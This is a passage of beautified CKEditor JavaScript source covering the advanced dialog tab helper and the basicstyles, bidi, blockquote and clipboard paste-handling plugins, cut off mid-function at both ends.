                return t.length && (n += "[" + t.join(",") + "]"), e.classes && (n += "(*)"), e.styles && (n += "{*}"),
                n;
            },
            createAdvancedTab: function(o, e, t) {
                e || (e = l);
                var n = o.lang.common, i = {
                    id: "advanced",
                    label: n.advancedTab,
                    title: n.advancedTab,
                    elements: [ {
                        type: "vbox",
                        padding: 1,
                        children: []
                    } ]
                }, a = [];
                return (e.id || e.dir) && (e.id && a.push({
                    id: "advId",
                    att: "id",
                    type: "text",
                    requiredContent: t ? t + "[id]" : null,
                    label: n.id,
                    setup: r,
                    commit: s
                }), e.dir && a.push({
                    id: "advLangDir",
                    att: "dir",
                    type: "select",
                    requiredContent: t ? t + "[dir]" : null,
                    label: n.langDir,
                    default: "",
                    style: "width:100%",
                    items: [ [ n.notSet, "" ], [ n.langDirLTR, "ltr" ], [ n.langDirRTL, "rtl" ] ],
                    setup: r,
                    commit: s
                }), i.elements[0].children.push({
                    type: "hbox",
                    widths: [ "50%", "50%" ],
                    children: [].concat(a)
                })), (e.styles || e.classes) && (a = [], e.styles && a.push({
                    id: "advStyles",
                    att: "style",
                    type: "text",
                    requiredContent: t ? t + "{cke-xyz}" : null,
                    label: n.styles,
                    default: "",
                    validate: CKEDITOR.dialog.validate.inlineStyle(n.invalidInlineStyle),
                    onChange: function() {},
                    getStyle: function(e, t) {
                        var n = this.getValue().match(RegExp("(?:^|;)\\s*" + e + "\\s*:\\s*([^;]*)", "i"));
                        return n ? n[1] : t;
                    },
                    updateStyle: function(e, t) {
                        var n = this.getValue(), i = o.document.createElement("span");
                        i.setAttribute("style", n), i.setStyle(e, t), n = CKEDITOR.tools.normalizeCssText(i.getAttribute("style")),
                        this.setValue(n, 1);
                    },
                    setup: r,
                    commit: s
                }), e.classes && a.push({
                    type: "hbox",
                    widths: [ "45%", "55%" ],
                    children: [ {
                        id: "advCSSClasses",
                        att: "class",
                        type: "text",
                        requiredContent: t ? t + "(cke-xyz)" : null,
                        label: n.cssClasses,
                        default: "",
                        setup: r,
                        commit: s
                    } ]
                }), i.elements[0].children.push({
                    type: "hbox",
                    widths: [ "50%", "50%" ],
                    children: [].concat(a)
                })), i;
            }
        });
    }(), CKEDITOR.plugins.add("basicstyles", {
        init: function(a) {
            var r = 0, e = function(e, t, n, i) {
                if (i) {
                    i = new CKEDITOR.style(i);
                    var o = s[n];
                    o.unshift(i), a.attachStyleStateChange(i, function(e) {
                        !a.readOnly && a.getCommand(n).setState(e);
                    }), a.addCommand(n, new CKEDITOR.styleCommand(i, {
                        contentForms: o
                    })), a.ui.addButton && a.ui.addButton(e, {
                        label: t,
                        command: n,
                        toolbar: "basicstyles," + (r += 10)
                    });
                }
            }, s = {
                bold: [ "strong", "b", [ "span", function(e) {
                    return "bold" == (e = e.styles["font-weight"]) || 700 <= +e;
                } ] ],
                italic: [ "em", "i", [ "span", function(e) {
                    return "italic" == e.styles["font-style"];
                } ] ],
                underline: [ "u", [ "span", function(e) {
                    return "underline" == e.styles["text-decoration"];
                } ] ],
                strike: [ "s", "strike", [ "span", function(e) {
                    return "line-through" == e.styles["text-decoration"];
                } ] ],
                subscript: [ "sub" ],
                superscript: [ "sup" ]
            }, t = a.config, n = a.lang.basicstyles;
            e("Bold", n.bold, "bold", t.coreStyles_bold), e("Italic", n.italic, "italic", t.coreStyles_italic),
            e("Underline", n.underline, "underline", t.coreStyles_underline), e("Strike", n.strike, "strike", t.coreStyles_strike),
            e("Subscript", n.subscript, "subscript", t.coreStyles_subscript), e("Superscript", n.superscript, "superscript", t.coreStyles_superscript),
            a.setKeystroke([ [ CKEDITOR.CTRL + 66, "bold" ], [ CKEDITOR.CTRL + 73, "italic" ], [ CKEDITOR.CTRL + 85, "underline" ] ]);
        }
    }), CKEDITOR.config.coreStyles_bold = {
        element: "strong",
        overrides: "b"
    }, CKEDITOR.config.coreStyles_italic = {
        element: "em",
        overrides: "i"
    }, CKEDITOR.config.coreStyles_underline = {
        element: "u"
    }, CKEDITOR.config.coreStyles_strike = {
        element: "s",
        overrides: "strike"
    }, CKEDITOR.config.coreStyles_subscript = {
        element: "sub"
    }, CKEDITOR.config.coreStyles_superscript = {
        element: "sup"
    }, function() {
        function f(e, t, n, i) {
            if (!e.isReadOnly() && !e.equals(n.editable())) {
                CKEDITOR.dom.element.setMarker(i, e, "bidi_processed", 1), i = e;
                for (var o = n.editable(); (i = i.getParent()) && !i.equals(o); ) if (i.getCustomData("bidi_processed")) return e.removeStyle("direction"),
                void e.removeAttribute("dir");
                ((i = "useComputedState" in n.config ? n.config.useComputedState : 1) ? e.getComputedStyle("direction") : e.getStyle("direction") || e.hasAttribute("dir")) != t && (e.removeStyle("direction"),
                i ? (e.removeAttribute("dir"), t != e.getComputedStyle("direction") && e.setAttribute("dir", t)) : e.setAttribute("dir", t),
                n.forceNextSelectionCheck());
            }
        }
        function m(e, t, n) {
            var i = e.getCommonAncestor(!1, !0);
            if ((e = e.clone()).enlarge(n == CKEDITOR.ENTER_BR ? CKEDITOR.ENLARGE_LIST_ITEM_CONTENTS : CKEDITOR.ENLARGE_BLOCK_CONTENTS),
            e.checkBoundaryOfElement(i, CKEDITOR.START) && e.checkBoundaryOfElement(i, CKEDITOR.END)) {
                for (var o; i && i.type == CKEDITOR.NODE_ELEMENT && (o = i.getParent()) && 1 == o.getChildCount() && !(i.getName() in t); ) i = o;
                return i.type == CKEDITOR.NODE_ELEMENT && i.getName() in t && i;
            }
        }
        function n(h) {
            return {
                context: "p",
                allowedContent: {
                    "h1 h2 h3 h4 h5 h6 table ul ol blockquote div tr p div li td": {
                        propertiesOnly: !0,
                        attributes: "dir"
                    }
                },
                requiredContent: "p[dir]",
                refresh: function(e, t) {
                    var n, i = e.config.useComputedState;
                    if (!(i = void 0 === i || i)) {
                        n = t.lastElement;
                        for (var o = e.editable(); n && !(n.getName() in r || n.equals(o)); ) {
                            var a = n.getParent();
                            if (!a) break;
                            n = a;
                        }
                    }
                    (n = n || t.block || t.blockLimit).equals(e.editable()) && (o = e.getSelection().getRanges()[0].getEnclosedNode()) && o.type == CKEDITOR.NODE_ELEMENT && (n = o),
                    n && (i = i ? n.getComputedStyle("direction") : n.getStyle("direction") || n.getAttribute("dir"),
                    e.getCommand("bidirtl").setState("rtl" == i ? CKEDITOR.TRISTATE_ON : CKEDITOR.TRISTATE_OFF),
                    e.getCommand("bidiltr").setState("ltr" == i ? CKEDITOR.TRISTATE_ON : CKEDITOR.TRISTATE_OFF)),
                    (i = (t.block || t.blockLimit || e.editable()).getDirection(1)) != (e._.selDir || e.lang.dir) && (e._.selDir = i,
                    e.fire("contentDirChanged", i));
                },
                exec: function(e) {
                    var t = e.getSelection(), i = e.config.enterMode;
                    if ((r = t.getRanges()) && r.length) {
                        for (var n, o = {}, a = t.createBookmarks(), r = r.createIterator(), s = 0; n = r.getNextRange(1); ) {
                            var l = n.getEnclosedNode();
                            l && (!l || l.type == CKEDITOR.NODE_ELEMENT && l.getName() in E) || (l = m(n, g, i)),
                            l && f(l, h, e, o);
                            var c = new CKEDITOR.dom.walker(n), d = a[s].startNode, u = a[s++].endNode;
                            for (c.evaluator = function(e) {
                                var t, n = i == CKEDITOR.ENTER_P ? "p" : "div";
                                return (t = !(e && e.type == CKEDITOR.NODE_ELEMENT)) || ((t = e.getName() in g) && ((n = !e.is(n)) || (n = !((n = e.getParent()) && n.type == CKEDITOR.NODE_ELEMENT && e.getParent().is("blockquote"))),
                                t = n && e.getPosition(d) & CKEDITOR.POSITION_FOLLOWING && (e.getPosition(u) & CKEDITOR.POSITION_PRECEDING + CKEDITOR.POSITION_CONTAINS) == CKEDITOR.POSITION_PRECEDING),
                                t = !t), !t;
                            }; l = c.next(); ) f(l, h, e, o);
                            for ((n = n.createIterator()).enlargeBr = i != CKEDITOR.ENTER_BR; l = n.getNextParagraph(i == CKEDITOR.ENTER_P ? "p" : "div"); ) f(l, h, e, o);
                        }
                        CKEDITOR.dom.element.clearAllMarkers(o), e.forceNextSelectionCheck(), t.selectBookmarks(a),
                        e.focus();
                    }
                }
            };
        }
        function e(o) {
            var a = o == t.setAttribute, r = o == t.removeAttribute, s = /\bdirection\s*:\s*(.*?)\s*(:?$|;)/;
            return function(e, t) {
                if (!this.isReadOnly()) {
                    var n;
                    if (n = e == (a || r ? "dir" : "direction") || "style" == e && (r || s.test(t))) {
                        e: {
                            for (var i = (n = this).getDocument().getBody().getParent(); n; ) {
                                if (n.equals(i)) {
                                    n = !1;
                                    break e;
                                }
                                n = n.getParent();
                            }
                            n = !0;
                        }
                        n = !n;
                    }
                    if (n && (n = this.getDirection(1), i = o.apply(this, arguments), n != this.getDirection(1))) return this.getDocument().fire("dirChanged", this),
                    i;
                }
                return o.apply(this, arguments);
            };
        }
        var g = {
            table: 1,
            ul: 1,
            ol: 1,
            blockquote: 1,
            div: 1
        }, E = {}, r = {};
        CKEDITOR.tools.extend(E, g, {
            tr: 1,
            p: 1,
            div: 1,
            li: 1
        }), CKEDITOR.tools.extend(r, E, {
            td: 1
        }), CKEDITOR.plugins.add("bidi", {
            init: function(a) {
                function e(e, t, n, i, o) {
                    a.addCommand(n, new CKEDITOR.command(a, i)), a.ui.addButton && a.ui.addButton(e, {
                        label: t,
                        command: n,
                        toolbar: "bidi," + o
                    });
                }
                if (!a.blockless) {
                    var t = a.lang.bidi;
                    e("BidiLtr", t.ltr, "bidiltr", n("ltr"), 10), e("BidiRtl", t.rtl, "bidirtl", n("rtl"), 20),
                    a.on("contentDom", function() {
                        a.document.on("dirChanged", function(e) {
                            a.fire("dirChanged", {
                                node: e.data,
                                dir: e.data.getDirection(1)
                            });
                        });
                    }), a.on("contentDirChanged", function(e) {
                        e = (a.lang.dir != e.data ? "add" : "remove") + "Class";
                        var t = a.ui.space(a.config.toolbarLocation);
                        t && t[e]("cke_mixed_dir_content");
                    });
                }
            }
        });
        for (var t = CKEDITOR.dom.element.prototype, i = [ "setStyle", "removeStyle", "setAttribute", "removeAttribute" ], o = 0; o < i.length; o++) t[i[o]] = CKEDITOR.tools.override(t[i[o]], e);
    }(), l = {
        exec: function(e) {
            var t = e.getCommand("blockquote").state, n = e.getSelection(), i = n && n.getRanges()[0];
            if (i) {
                var o = n.createBookmarks();
                if (CKEDITOR.env.ie) {
                    var a, r = o[0].startNode, s = o[0].endNode;
                    if (r && "blockquote" == r.getParent().getName()) for (a = r; a = a.getNext(); ) if (a.type == CKEDITOR.NODE_ELEMENT && a.isBlockBoundary()) {
                        r.move(a, !0);
                        break;
                    }
                    if (s && "blockquote" == s.getParent().getName()) for (a = s; a = a.getPrevious(); ) if (a.type == CKEDITOR.NODE_ELEMENT && a.isBlockBoundary()) {
                        s.move(a);
                        break;
                    }
                }
                if ((l = i.createIterator()).enlargeBr = e.config.enterMode != CKEDITOR.ENTER_BR,
                t == CKEDITOR.TRISTATE_OFF) {
                    for (r = []; t = l.getNextParagraph(); ) r.push(t);
                    for (r.length < 1 && (t = e.document.createElement(e.config.enterMode == CKEDITOR.ENTER_P ? "p" : "div"),
                    s = o.shift(), i.insertNode(t), t.append(new CKEDITOR.dom.text("\ufeff", e.document)),
                    i.moveToBookmark(s), i.selectNodeContents(t), i.collapse(!0), s = i.createBookmark(),
                    r.push(t), o.unshift(s)), a = r[0].getParent(), i = [], s = 0; s < r.length; s++) t = r[s],
                    a = a.getCommonAncestor(t.getParent());
                    for (t = {
                        table: 1,
                        tbody: 1,
                        tr: 1,
                        ol: 1,
                        ul: 1
                    }; t[a.getName()]; ) a = a.getParent();
                    for (s = null; 0 < r.length; ) {
                        for (t = r.shift(); !t.getParent().equals(a); ) t = t.getParent();
                        t.equals(s) || i.push(t), s = t;
                    }
                    for (;0 < i.length; ) if ("blockquote" == (t = i.shift()).getName()) {
                        for (s = new CKEDITOR.dom.documentFragment(e.document); t.getFirst(); ) s.append(t.getFirst().remove()),
                        r.push(s.getLast());
                        s.replace(t);
                    } else r.push(t);
                    for ((i = e.document.createElement("blockquote")).insertBefore(r[0]); 0 < r.length; ) t = r.shift(),
                    i.append(t);
                } else if (t == CKEDITOR.TRISTATE_ON) {
                    for (s = [], a = {}; t = l.getNextParagraph(); ) {
                        for (r = i = null; t.getParent(); ) {
                            if ("blockquote" == t.getParent().getName()) {
                                i = t.getParent(), r = t;
                                break;
                            }
                            t = t.getParent();
                        }
                        i && r && !r.getCustomData("blockquote_moveout") && (s.push(r), CKEDITOR.dom.element.setMarker(a, r, "blockquote_moveout", !0));
                    }
                    for (CKEDITOR.dom.element.clearAllMarkers(a), t = [], r = [], a = {}; 0 < s.length; ) i = (l = s.shift()).getParent(),
                    l.getPrevious() ? l.getNext() ? (l.breakParent(l.getParent()), r.push(l.getNext())) : l.remove().insertAfter(i) : l.remove().insertBefore(i),
                    i.getCustomData("blockquote_processed") || (r.push(i), CKEDITOR.dom.element.setMarker(a, i, "blockquote_processed", !0)),
                    t.push(l);
                    for (CKEDITOR.dom.element.clearAllMarkers(a), s = r.length - 1; 0 <= s; s--) {
                        e: {
                            for (var l = 0, c = (a = i = r[s]).getChildCount(), d = void 0; l < c && (d = a.getChild(l)); l++) if (d.type == CKEDITOR.NODE_ELEMENT && d.isBlockBoundary()) {
                                a = !1;
                                break e;
                            }
                            a = !0;
                        }
                        a && i.remove();
                    }
                    if (e.config.enterMode == CKEDITOR.ENTER_BR) for (i = !0; t.length; ) if ("div" == (l = t.shift()).getName()) {
                        for (s = new CKEDITOR.dom.documentFragment(e.document), i && l.getPrevious() && !(l.getPrevious().type == CKEDITOR.NODE_ELEMENT && l.getPrevious().isBlockBoundary()) && s.append(e.document.createElement("br")),
                        i = l.getNext() && !(l.getNext().type == CKEDITOR.NODE_ELEMENT && l.getNext().isBlockBoundary()); l.getFirst(); ) l.getFirst().remove().appendTo(s);
                        i && s.append(e.document.createElement("br")), s.replace(l), i = !1;
                    }
                }
                n.selectBookmarks(o), e.focus();
            }
        },
        refresh: function(e, t) {
            this.setState(e.elementPath(t.block || t.blockLimit).contains("blockquote", 1) ? CKEDITOR.TRISTATE_ON : CKEDITOR.TRISTATE_OFF);
        },
        context: "blockquote",
        allowedContent: "blockquote",
        requiredContent: "blockquote"
    }, CKEDITOR.plugins.add("blockquote", {
        init: function(e) {
            e.blockless || (e.addCommand("blockquote", l), e.ui.addButton && e.ui.addButton("Blockquote", {
                label: e.lang.blockquote.toolbar,
                command: "blockquote",
                toolbar: "blocks,10"
            }));
        }
    }), function() {
        function g(e, t) {
            return e.enterMode == CKEDITOR.ENTER_BR ? t = t.replace(/(<\/p><p>)+/g, function(e) {
                return CKEDITOR.tools.repeat("<br>", e.length / 7 * 2);
            }).replace(/<\/?p>/g, "") : e.enterMode == CKEDITOR.ENTER_DIV && (t = t.replace(/<(\/)?p>/g, "<$1div>")),
            t;
        }
        CKEDITOR.plugins.add("clipboard", {
            requires: "dialog",
            init: function(f) {
                var m;
                (function(m) {
                    function t(e) {
                        return {
                            type: e,
                            canUndo: "cut" == e,
                            startDisabled: !0,
                            exec: function() {
                                "cut" == this.type && i();
                                var e, t = this.type;
                                if (CKEDITOR.env.ie) e = l(t); else try {
                                    e = m.document.$.execCommand(t, !1, null);
                                } catch (t) {
                                    e = !1;
                                }
                                return e || alert(m.lang.clipboard[this.type + "Error"]), e;
                            }
                        };
                    }
                    function s() {
                        d = 1, setTimeout(function() {
                            d = 0;
                        }, 100);
                    }
                    function n() {
                        c = 1, setTimeout(function() {
                            c = 0;
                        }, 10);
                    }
                    function l(e) {
                        var t = m.document, n = t.getBody(), i = !1, o = function() {
                            i = !0;
                        };
                        return n.on(e, o), (7 < CKEDITOR.env.version ? t.$ : t.$.selection.createRange()).execCommand(e),
                        n.removeListener(e, o), i;
                    }
                    function g(e, t, n) {
                        return e = {
                            type: e
                        }, !(n && !1 === m.fire("beforePaste", e) || !t) && (e.dataValue = t, m.fire("paste", e));
                    }
                    function i() {
                        if (CKEDITOR.env.ie && !CKEDITOR.env.quirks) {
                            var e, t, n, i = m.getSelection();
                            i.getType() == CKEDITOR.SELECTION_ELEMENT && (e = i.getSelectedElement()) && (t = i.getRanges()[0],
                            (n = m.document.createText("")).insertBefore(e), t.setStartBefore(n), t.setEndAfter(e),
                            i.selectRanges([ t ]), setTimeout(function() {
                                e.getParent() && (n.remove(), i.selectElement(e));
                            }, 0));
                        }
                    }
                    function o(e) {
                        var h = {
                            type: "auto"
                        }, f = m.fire("beforePaste", h);
                        !function(e, t) {
                            var n, i = m.document, o = m.editable(), a = function(e) {
                                e.cancel();
                            };
                            if (!i.getById("cke_pastebin")) {
                                var r = m.getSelection(), s = r.createBookmarks();
                                CKEDITOR.env.ie && r.root.fire("selectionchange");
                                var l = new CKEDITOR.dom.element(!CKEDITOR.env.webkit && !o.is("body") || CKEDITOR.env.ie ? "div" : "body", i);
                                l.setAttributes({
                                    id: "cke_pastebin",
                                    "data-cke-temp": "1"
                                });
                                var c = 0;
                                i = i.getWindow(), CKEDITOR.env.webkit ? (o.append(l), l.addClass("cke_editable"),
                                o.is("body") || (c = (c = "static" != o.getComputedStyle("position") ? o : CKEDITOR.dom.element.get(o.$.offsetParent)).getDocumentPosition().y)) : o.getAscendant(CKEDITOR.env.ie ? "body" : "html", 1).append(l),
                                l.setStyles({
                                    position: "absolute",
                                    top: i.getScrollPosition().y - c + 10 + "px",
                                    width: "1px",
                                    height: Math.max(1, i.getViewPaneSize().height - 20) + "px",
                                    overflow: "hidden",
                                    margin: 0,
                                    padding: 0
                                }), CKEDITOR.env.safari && l.setStyles(CKEDITOR.tools.cssVendorPrefix("user-select", "text")),
                                (c = l.getParent().isReadOnly()) ? (l.setOpacity(0), l.setAttribute("contenteditable", !0)) : l.setStyle("ltr" == m.config.contentsLangDirection ? "left" : "right", "-1000px"),
                                m.on("selectionChange", a, null, null, 0), (CKEDITOR.env.webkit || CKEDITOR.env.gecko) && (n = o.once("blur", a, null, null, -100)),
                                c && l.focus(), (c = new CKEDITOR.dom.range(l)).selectNodeContents(l);
                                var d = c.select();
                                CKEDITOR.env.ie && (n = o.once("blur", function() {
                                    m.lockSelection(d);
                                }));
                                var u = CKEDITOR.document.getWindow().getScrollPosition().y;
                                setTimeout(function() {
                                    var e, t;
                                    CKEDITOR.env.webkit && (CKEDITOR.document.getBody().$.scrollTop = u), n && n.removeListener(),
                                    CKEDITOR.env.ie && o.focus(), r.selectBookmarks(s), l.remove(), CKEDITOR.env.webkit && (e = l.getFirst()) && e.is && e.hasClass("Apple-style-span") && (l = e),
                                    m.removeListener("selectionChange", a), t = (t = l.getHtml()).replace(/<span[^>]+data-cke-bookmark[^<]*?<\/span>/gi, ""),
                                    f && g(h.type, t, 0);
                                }, 0);
                            }
                        }();
                    }
                    function a() {
                        if ("wysiwyg" == m.mode) {
                            var e = r("paste");
                            m.getCommand("cut").setState(r("cut")), m.getCommand("copy").setState(r("copy")),
                            m.getCommand("paste").setState(e), m.fire("pasteState", e);
                        }
                    }
                    function r(e) {
                        if (u && e in {
                            paste: 1,
                            cut: 1
                        }) return CKEDITOR.TRISTATE_DISABLED;
                        if ("paste" == e) return CKEDITOR.TRISTATE_OFF;
                        var t = (e = m.getSelection()).getRanges();
                        return e.getType() == CKEDITOR.SELECTION_NONE || 1 == t.length && t[0].collapsed ? CKEDITOR.TRISTATE_DISABLED : CKEDITOR.TRISTATE_OFF;
                    }
                    var c = 0, d = 0, u = 0, h = CKEDITOR.env.ie ? "beforepaste" : "paste";
                    m.on("key", function(e) {
                        if ("wysiwyg" == m.mode) switch (e.data.keyCode) {
                          case CKEDITOR.CTRL + 86:
                          case CKEDITOR.SHIFT + 45:
                            e = m.editable(), s(), !CKEDITOR.env.ie && e.fire("beforepaste");
                            break;

                          case CKEDITOR.CTRL + 88:
                          case CKEDITOR.SHIFT + 46:
                            m.fire("saveSnapshot"), setTimeout(function() {
                                m.fire("saveSnapshot");
                            }, 50);
                        }
                    }), m.on("contentDom", function() {
                        var e, t = m.editable();
                        t.on(h, function(e) {
                            (!CKEDITOR.env.ie || !c) && o();
                        }), CKEDITOR.env.ie && t.on("paste", function(e) {
                            d || (s(), e.data.preventDefault(), o(), l("paste") || m.openDialog("paste"));
                        }), CKEDITOR.env.ie && (t.on("contextmenu", n, null, null, 0), t.on("beforepaste", function(e) {
                            e.data && !e.data.$.ctrlKey && !e.data.$.shiftKey && n();
                        }, null, null, 0)), t.on("beforecut", function() {
                            !c && i();
                        }), t.attachListener(CKEDITOR.env.ie ? t : m.document.getDocumentElement(), "mouseup", function() {
                            e = setTimeout(function() {
                                a();
                            }, 0);
                        }), m.on("destroy", function() {
                            clearTimeout(e);
                        }), t.on("keyup", a);
                    }), m.on("selectionChange", function(e) {
                        u = e.data.selection.getRanges()[0].checkReadOnly(), a();
                    }), m.contextMenu && m.contextMenu.addListener(function(e, t) {
                        return u = t.getRanges()[0].checkReadOnly(), {
                            cut: r("cut"),
                            copy: r("copy"),
                            paste: r("paste")
                        };
                    }), function() {
                        function e(e, t, n, i, o) {
                            var a = m.lang.clipboard[t];
                            m.addCommand(t, n), m.ui.addButton && m.ui.addButton(e, {
                                label: a,
                                command: t,
                                toolbar: "clipboard," + i
                            }), m.addMenuItems && m.addMenuItem(t, {
                                label: a,
                                command: t,
                                group: "clipboard",
                                order: o
                            });
                        }
                        e("Cut", "cut", t("cut"), 10, 1), e("Copy", "copy", t("copy"), 20, 4), e("Paste", "paste", {
                            canUndo: !1,
                            async: !0,
                            exec: function(n, e) {
                                var t = function(e, t) {
                                    e && g(e.type, e.dataValue, !!t), n.fire("afterCommandExec", {
                                        name: "paste",
                                        command: i,
                                        returnValue: !!e
                                    });
                                }, i = this;
                                "string" == typeof e ? t({
                                    type: "auto",
                                    dataValue: e
                                }, 1) : n.getClipboardData(t);
                            }
                        }, 30, 8);
                    }(), m.getClipboardData = function(e, t) {
                        function n(e) {
                            e.removeListener(), e.cancel(), t(e.data);
                        }
                        function i(e) {
                            e.removeListener(), e.cancel(), r = !0, t({
                                type: a,
                                dataValue: e.data
                            });
                        }
                        var o = !1, a = "auto", r = !1;
                        t || (t = e, e = null), m.on("paste", n, null, null, 0), m.on("beforePaste", function(e) {
                            e.removeListener(), o = !0, a = e.data.type;
                        }, null, null, 1e3), !1 === function() {
                            if (CKEDITOR.env.ie) {
                                m.focus(), s();
                                var e = m.focusManager;
                                if (e.lock(), m.editable().fire(h) && !l("paste")) return e.unlock(), !1;
                                e.unlock();
                            } else try {
                                if (m.editable().fire(h) && !m.document.$.execCommand("Paste", !1, null)) throw 0;
                            } catch (e) {
                                return !1;
                            }
                            return !0;
                        }() && (m.removeListener("paste", n), o && m.fire("pasteDialog", function() {
                            this.customTitle = e && e.title;
                        }) ? (m.on("pasteDialogCommit", i), m.on("dialogHide", function(e) {
                            e.removeListener(), e.data.removeListener("pasteDialogCommit", i), setTimeout(function() {
                                r || t(null);
                            }, 10);
                        })) : t(null));
                    };
                })(f), CKEDITOR.dialog.add("paste", CKEDITOR.getUrl(this.path + "dialogs/paste.js")),
                f.on("paste", function(n) {
                    var e = n.data.dataValue, i = CKEDITOR.dtd.$block;
                    if (-1 < e.indexOf("Apple-") && (e = e.replace(/<span class="Apple-converted-space">&nbsp;<\/span>/gi, " "),
                    "html" != n.data.type && (e = e.replace(/<span class="Apple-tab-span"[^>]*>([^<]*)<\/span>/gi, function(e, t) {
                        return t.replace(/\t/g, "&nbsp;&nbsp; &nbsp;");
                    })), -1 < e.indexOf('<br class="Apple-interchange-newline">') && (n.data.startsWithEOL = 1,
                    n.data.preSniffing = "html", e = e.replace(/<br class="Apple-interchange-newline">/, "")),
                    e = e.replace(/(<[^>]+) class="Apple-[^"]*"/gi, "$1")), e.match(/^<[^<]+cke_(editable|contents)/i)) {
                        var t, o, a = new CKEDITOR.dom.element("div");
                        for (a.setHtml(e); 1 == a.getChildCount() && (t = a.getFirst()) && t.type == CKEDITOR.NODE_ELEMENT && (t.hasClass("cke_editable") || t.hasClass("cke_contents")); ) a = o = t;
                        o && (e = o.getHtml().replace(/<br>$/i, ""));
                    }
                    CKEDITOR.env.ie ? e = e.replace(/^&nbsp;(?: |\r\n)?<(\w+)/g, function(e, t) {
                        return t.toLowerCase() in i ? (n.data.preSniffing = "html", "<" + t) : e;
                    }) : CKEDITOR.env.webkit ? e = e.replace(/<\/(\w+)><div><br><\/div>$/, function(e, t) {
                        return t in i ? (n.data.endsWithEOL = 1, "</" + t + ">") : e;
                    }) : CKEDITOR.env.gecko && (e = e.replace(/(\s)<br>$/, "$1")), n.data.dataValue = e;
                }, null, null, 3), f.on("paste", function(e) {
                    var t, n, i, o, a, r, s, l, c, d = (e = e.data).type, u = e.dataValue, h = f.config.clipboard_defaultContentType || "html";
                    "htmlifiedtext" == (t = "html" == d || "html" == e.preSniffing ? "html" : function(e) {
                        if (CKEDITOR.env.webkit) {
                            if (!e.match(/^[^<]*$/g) && !e.match(/^(<div><br( ?\/)?><\/div>|<div>[^<]*<\/div>)*$/gi)) return "html";
                        } else if (CKEDITOR.env.ie) {
                            if (!e.match(/^([^<]|<br( ?\/)?>)*$/gi) && !e.match(/^(<p>([^<]|<br( ?\/)?>)*<\/p>|(\r\n))*$/gi)) return "html";
                        } else {
                            if (!CKEDITOR.env.gecko) return "html";
                            if (!e.match(/^([^<]|<br( ?\/)?>)*$/gi)) return "html";
                        }
                        return "htmlifiedtext";
                    }(u)) ? u = function(e, t) {
                        function n(e) {
                            return CKEDITOR.tools.repeat("</p><p>", ~~(e / 2)) + (1 == e % 2 ? "<br>" : "");
                        }
                        return (t = (t = t.replace(/\s+/g, " ").replace(/> +</g, "><").replace(/<br ?\/>/gi, "<br>")).replace(/<\/?[A-Z]+>/g, function(e) {
                            return e.toLowerCase();
                        })).match(/^[^<]$/) ? t : (CKEDITOR.env.webkit && -1 < t.indexOf("<div>") && ((t = t.replace(/^(<div>(<br>|)<\/div>)(?!$|(<div>(<br>|)<\/div>))/g, "<br>").replace(/^(<div>(<br>|)<\/div>){2}(?!$)/g, "<div></div>")).match(/<div>(<br>|)<\/div>/) && (t = "<p>" + t.replace(/(<div>(<br>|)<\/div>)+/g, function(e) {
                            return n(e.split("</div><div>").length + 1);
                        }) + "</p>"), t = (t = t.replace(/<\/div><div>/g, "<br>")).replace(/<\/?div>/g, "")),
                        CKEDITOR.env.gecko && e.enterMode != CKEDITOR.ENTER_BR && (CKEDITOR.env.gecko && (t = t.replace(/^<br><br>$/, "<br>")),
                        -1 < t.indexOf("<br><br>") && (t = "<p>" + t.replace(/(<br>){2,}/g, function(e) {
                            return n(e.length / 4);
                        }) + "</p>")), g(e, t));
                    }(f.config, u) : "text" == d && "html" == t && (u = function(e, t, n) {
                        t = new CKEDITOR.htmlParser.fragment.fromHtml(t);
                        var i = new CKEDITOR.htmlParser.basicWriter();
                        t.writeHtml(i, n);
                        var o = 0;
                        return g(e, t = (t = (t = i.getHtml()).replace(/\s*(<\/?[a-z:]+ ?\/?>)\s*/g, "$1").replace(/(<cke:br \/>){2,}/g, "<cke:br />").replace(/(<cke:br \/>)(<\/?p>|<br \/>)/g, "$2").replace(/(<\/?p>|<br \/>)(<cke:br \/>)/g, "$1").replace(/<(cke:)?br( \/)?>/g, "<br>").replace(/<p><\/p>/g, "")).replace(/<\/?p>/g, function(e) {
                            if ("<p>" == e) {
                                if (1 < ++o) return "</p><p>";
                            } else if (0 < --o) return "</p><p>";
                            return e;
                        }).replace(/<p><\/p>/g, ""));
                    }(f.config, u, m || (n = new CKEDITOR.htmlParser.filter(), i = {
                        blockquote: 1,
                        dl: 1,
                        fieldset: 1,
                        h1: 1,
                        h2: 1,
                        h3: 1,
                        h4: 1,
                        h5: 1,
                        h6: 1,
                        ol: 1,
                        p: 1,
                        table: 1,
                        ul: 1
                    }, o = CKEDITOR.tools.extend({
                        br: 0
                    }, CKEDITOR.dtd.$inline), a = {
                        p: 1,
                        br: 1,
                        "cke:br": 1
                    }, r = CKEDITOR.dtd, s = CKEDITOR.tools.extend({
                        area: 1,
                        basefont: 1,
                        embed: 1,
                        iframe: 1,
                        map: 1,
                        object: 1,
                        param: 1
                    }, CKEDITOR.dtd.$nonBodyContent, CKEDITOR.dtd.$cdata), l = function(e) {
                        delete e.name, e.add(new CKEDITOR.htmlParser.text(" "));
                    }, c = function(e) {
                        for (var t, n = e; (n = n.next) && n.name && n.name.match(/^h\d$/); ) for ((t = new CKEDITOR.htmlParser.element("cke:br")).isEmpty = !0,
                        e.add(t); t = n.children.shift(); ) e.add(t);
                    }, n.addRules({
                        elements: {
                            h1: c,
                            h2: c,
                            h3: c,
                            h4: c,
                            h5: c,
                            h6: c,
                            img: function(e) {
                                var t = " ";
                                return (e = CKEDITOR.tools.trim(e.attributes.alt || "")) && !e.match(/(^http|\.(jpe?g|gif|png))/i) && (t = " [" + e + "] "),
                                new CKEDITOR.htmlParser.text(t);
                            },
                            td: l,
                            th: l,
                            $: function(e) {
                                var t, n = e.name;
                                if (s[n]) return !1;
                                if (e.attributes = {}, "br" == n) return e;
                                if (i[n]) e.name = "p"; else if (o[n]) delete e.name; else if (r[n]) {
                                    if ((t = new CKEDITOR.htmlParser.element("cke:br")).isEmpty = !0, CKEDITOR.dtd.$empty[n]) return t;
                                    e.add(t, 0), (t = t.clone()).isEmpty = !0, e.add(t), delete e.name;
                                }
                                return a[e.name] || delete e.name, e;
                            }
                        }
                    }, {
                        applyToAll: !0
                    }), m = n))), e.startsWithEOL && (u = '<br data-cke-eol="1">' + u), e.endsWithEOL && (u += '<br data-cke-eol="1">'),
                    "auto" == d && (d = "html" == t || "html" == h ? "html" : "text"), e.type = d, e.dataValue = u,
                    delete e.preSniffing, delete e.startsWithEOL, delete e.endsWithEOL;
                }, null, null, 6), f.on("paste", function(e) {
